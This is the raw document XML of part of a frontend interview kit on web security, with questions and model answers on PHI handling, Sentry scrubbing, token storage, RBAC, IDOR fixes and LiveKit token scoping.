        <w:rPr/>
        <w:t xml:space="preserve"> "I walk the feature's data flow and ask how each step could be abused, then fix the high-impact risks first."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Q54. What security testing belongs in the pipeline?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SAST, dependency and secret scanning, DAST, an authorisation test matrix and periodic penetration tests.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Automated checks catch regressions; pentests catch what automation misses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> CodeQL and Dependabot on every PR, a role × endpoint test suite in CI, and an annual pentest.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Security checks run on every PR, and the authorisation matrix guarantees fixed issues stay fixed."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🏥 Healthcare and PHI (Your Domain)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Q55. What is PHI, and which regulations apply?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Protected Health Information: health data linked to an identifiable person; in the US governed by HIPAA, with other laws like GDPR elsewhere.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> It includes names with medical context, record numbers, appointment details, conversations and recordings. Know the basics without overclaiming legal expertise.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A recording of a patient's interpreted consultation is PHI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "PHI is any health information tied to a person, and our design treated it as the most sensitive data we had."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Q56. What are the frontend rules for PHI?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No PHI in browser storage, URLs, titles, analytics, logs or error reports; idle logout and cache clearing; no trackers on PHI screens; TLS and secure cookies; server-side audit logging.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Assume anything stored or sent to a third party could leak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The page title says "Call details", not the patient's name, because titles end up in browser history.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "PHI only lives in memory while it's on screen; it never reaches storage, URLs or third parties."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Q57. How do you use Sentry and monitoring with PHI?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sendDefaultPii: false</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, scrub in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>beforeSend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beforeBreadcrumb</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, disable or mask session replay, avoid console breadcrumbs, and sign a data-processing agreement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Error tools capture request bodies, inputs and console output by default.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Sentry.init({ dsn, sendDefaultPii: false,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beforeSend(e) { delete e.request?.data; if (e.user) e.user = { id: e.user.id }; return e; },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beforeBreadcrumb: (b) =&gt; (b.category === 'console' ? null : b) });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"Error tracking is a common PHI leak, so scrubbing is configured before the first event is ever sent."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Q58. How do you handle recordings and transcripts?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Encryption at rest, short-lived signed URLs, role-based access, an audit trail, retention policies and recorded consent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Each access is logged so you can answer "who listened to this call?".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The audio player requests a 5-minute signed URL each time; the server logs the viewer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Recordings are encrypted, accessed through expiring links, and every access is audited."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Q59. How do you secure LiveKit and WebRTC?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Short-lived, role-scoped tokens, opaque room names, built-in DTLS-SRTP encryption (plus E2EE where required), TURN over TLS and validated webhooks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Tokens determine who can publish or subscribe in which room.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> An observer's token has </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>canPublish: false</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, expires in 10 minutes, and the room is named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rm_8f2c…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"Tokens are minted on the server with minimal grants, and room names never contain patient information."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🧩 Level 4 — Scenario-Based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Q60. A pentest found JWTs in localStorage. What do you change?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Move to HttpOnly cookies or a BFF, short-lived tokens with rotation, add a CSP, and migrate users at next login.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Delete the old tokens from storage during migration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> On next login the server sets an HttpOnly session cookie and the client removes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>localStorage.token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"Tokens move out of JavaScript's reach, and a CSP reduces the chance of XSS in the first place."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Q61. Agents can see other teams' calls by changing the URL.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It's IDOR: add server-side tenant, team and ownership checks on every endpoint, add a test matrix, and check logs for exploitation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Follow the incident process if it was exploited.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A FastAPI dependency </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>require_call_access(call_id, user)</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> on every call route, tested for each role.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Fix it on the server, prove it with tests, and investigate whether it was used."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Q62. Marketing wants a third-party chat widget on the patient dashboard.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Keep it off PHI pages or isolate it in a sandboxed iframe on another origin, with a CSP allowlist and a vendor agreement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A script on the page can read everything on the page.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The widget appears on marketing and help pages only, not the call history screen.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Any third-party script on a PHI page can read PHI, so it either stays off those pages or is isolated."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Q63. LLM-generated summaries show raw HTML from transcripts.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Sanitise the output or render markdown with HTML disabled, restrict links, and test with injection payloads.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Model output is untrusted input and can carry injected markup.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react-markdown</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> with no raw HTML plugin, plus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rel="noopener noreferrer"</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> on links.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Model output goes through the same sanitising as any user input."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Q64. A user is logged out in one tab but still active in another.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Broadcast logout via BroadcastChannel or the storage event, and invalidate the refresh token on the server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Other tabs then fail their next request with 401 even if they missed the broadcast.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new BroadcastChannel('auth').postMessage('logout')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"Logout is broadcast to every tab and enforced on the server."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Q65. You must allow your app to be embedded in a partner's portal.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Allow the partner in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>frame-ancestors</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SameSite=None; Secure</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> cookies or a token handoff, check origins in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>postMessage</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, and review clickjacking risks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Third-party cookies may be blocked, so a token handoff is often more reliable.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Content-Security-Policy: frame-ancestors https://portal.partner.com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"Embedding is opt-in per partner, with origin-checked messaging and explicit framing rules."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Q66. Error tracking captured patient names in breadcrumbs.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Ask the vendor to purge the events, add scrubbing rules, fix the logging code, add lint rules or tests, and document the incident.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> It's a data incident, so it follows the incident process.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>no-console-pii</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> lint rule and a unit test asserting scrubbed events.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Contain, purge, fix the cause and prevent recurrence, documented as an incident."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🎯 From Your Resume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Q67. "Walk me through your security audit."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Scope, threat model, checklist, per-role and per-tenant endpoint testing, token review, PHI search, severity rating, fixes with tests, and a re-audit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Prepare three real findings as problem → impact → fix → prevention.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Permissions enforced only in the UI → any user could call admin APIs → permission dependency on every route → role × endpoint test matrix."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "I mapped roles and PHI flows, tested every endpoint as every role and tenant, reviewed tokens and storage, fixed issues with tests, and re-audited."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Q68. "What were the 8 critical issues?"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Describe only real ones, mapped to categories like UI-only RBAC, missing tenant scoping, tokens in localStorage, no rotation, long-lived tokens, PHI in logs or storage, and missing headers.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Interviewers probe each one, so pick ones you understand deeply.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Three were access control, two token handling, two PHI exposure in logs and storage, and one missing security headers." </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(Use your real breakdown.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "They fell into access control, token handling and PHI exposure; I can go deep on any of them."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Q69. "What does 'cut findings by 85%' mean exactly?"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The number of open findings in the re-audit versus the initial audit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> State whether it's a raw count or severity-weighted, and what remained.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "40 open findings down to 6, all lower severity with owners and dates." </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(Use your real numbers.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "It's open findings before and after, and the remaining ones were low severity and tracked."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Q70. "How did you handle RBAC in FastAPI and React together?"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FastAPI enforced role, tenant and ownership on every route; React used the same permission list for navigation and buttons; a test matrix verified it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> One source of truth for permissions kept frontend and backend consistent.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Depends(require_permission("calls:score"))</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> on the route; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>can(role, 'calls:score')</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> in the UI.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "The server enforced, the UI reflected, and tests proved every role against every endpoint."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Q71. "How are LiveKit tokens secured?"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Generated on the server per user and room, short-lived, with minimal grants, and opaque room names.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The client never constructs tokens or sees the API secret.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> An interpreter's token allows publish and subscribe in one room for 10 minutes; an observer's allows subscribe only.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Tokens are minted server-side with the least privilege each role needs and expire quickly."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 — Web Fundamentals and Security</dc:title>
  <dc:subject/>
  <dc:creator>Frontend Interview Kit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